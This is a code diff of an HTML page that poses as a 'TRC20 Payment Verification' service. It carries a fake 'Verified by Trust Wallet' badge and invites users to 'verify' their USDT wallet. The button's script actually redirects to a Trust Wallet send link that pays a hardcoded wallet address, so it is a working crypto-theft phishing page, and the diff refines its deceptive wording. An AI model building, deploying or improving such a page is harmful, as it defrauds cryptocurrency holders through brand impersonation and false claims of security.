@@ -1,98 +1,114 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TRC20 Secure Payment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TRC20 Payment Verification</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to bottom right, #121212, #1f1f1f);
-      color: white;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+      background: #0c0c0c;
+      color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
       text-align: center;
-    }
-    header {
-      margin-bottom: 20px;
-    }
-    header h1 {
-      font-size: 1.2rem;
-      color: #4ade80;
-      background: rgba(255, 255, 255, 0.1);
-      padding: 6px 12px;
-      border-radius: 10px;
-    }
-    img.logo {
-      width: 100px;
-      margin-bottom: 20px;
-      border-radius: 20px;
-      box-shadow: 0 0 15px rgba(0,255,255,0.3);
-    }
-    h2 {
-      font-size: 1.5rem;
-      margin: 10px 0;
-    }
-    .button {
-      background-color: #00c2ff;
-      color: white;
-      padding: 12px 25px;
-      border: none;
-      border-radius: 30px;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: background 0.3s ease;
-      margin-top: 15px;
-    }
-    .button:hover {
-      background-color: #009edb;
-    }
-    #status {
-      margin-top: 15px;
-      font-size: 1rem;
-      color: #a3e635;
-    }
-    footer {
-      font-size: 0.85rem;
-      margin-top: 20px;
-      color: #888;
-    }
+    }.container {
+  background: #1a1a1a;
+  padding: 30px;
+  border-radius: 20px;
+  box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
+  width: 90%;
+  max-width: 400px;
+}
+
+.trust-badge {
+  background: #0f0;
+  color: #000;
+  padding: 8px 16px;
+  border-radius: 30px;
+  font-weight: bold;
+  display: inline-block;
+  margin-bottom: 20px;
+}
+
+img.logo {
+  width: 100px;
+  height: 100px;
+  border-radius: 20px;
+  margin-bottom: 20px;
+  background: white;
+  padding: 10px;
+}
+
+h2 {
+  font-size: 22px;
+  margin-bottom: 10px;
+}
+
+p {
+  font-size: 14px;
+  color: #ccc;
+}
+
+button {
+  background: #00c2ff;
+  border: none;
+  padding: 12px 24px;
+  border-radius: 30px;
+  color: #fff;
+  font-size: 16px;
+  margin-top: 20px;
+  cursor: pointer;
+  transition: 0.3s ease;
+}
+
+button:hover {
+  background: #009fd4;
+}
+
+#status {
+  margin-top: 15px;
+  font-size: 14px;
+  color: #a3e635;
+}
+
+footer {
+  margin-top: 30px;
+  font-size: 12px;
+  color: #666;
+}
+
   </style>
 </head>
 <body>
-  <header>
-    <h1>✅ Verified by Trust Wallet</h1>
-  </header>
+  <div class="container">
+    <div class="trust-badge">
+      ✅ Verified by Trust Wallet
+    </div><img src="logo.png" alt="TRC20 Logo" class="logo" />
 
-  <img src="logo.png" alt="TRC20 Logo" class="logo" />
+<h2>Secure TRC20 Payment</h2>
+<p>Click the button below to verify your USDT wallet. This process is secured by Trust Wallet protocol.</p>
 
-  <h2>Secure TRC20 Payment</h2>
-  <p>Click below to verify your USDT wallet via Trust Wallet DApp.</p>
+<button onclick="verifyUSDT()">Verify USDT</button>
+<div id="status"></div>
 
-  <button class="button" onclick="verifyUSDT()">Verify USDT</button>
-  <div id="status"></div>
-
-  <footer>
-    Powered by TRC20 Gateway. Your data is secured.
-  </footer>
-
-  <script>
+  </div>  <footer>
+    &copy; 2025 TRC20 Gateway. All rights reserved.
+  </footer>  <script>
     function verifyUSDT() {
       const status = document.getElementById('status');
-      status.innerText = '⏳ Processing...';
-      
-      // Replace with real address (HIDDEN)
+      status.innerText = 'Processing...';
+
       const walletAddress = "TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs";
       const payLink = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}`;
-      
+
       setTimeout(() => {
         window.location.href = payLink;
-      }, 2000); // Simulate processing
+      }, 1500);
     }
-  </script>
-</body>
+  </script></body>
 </html>
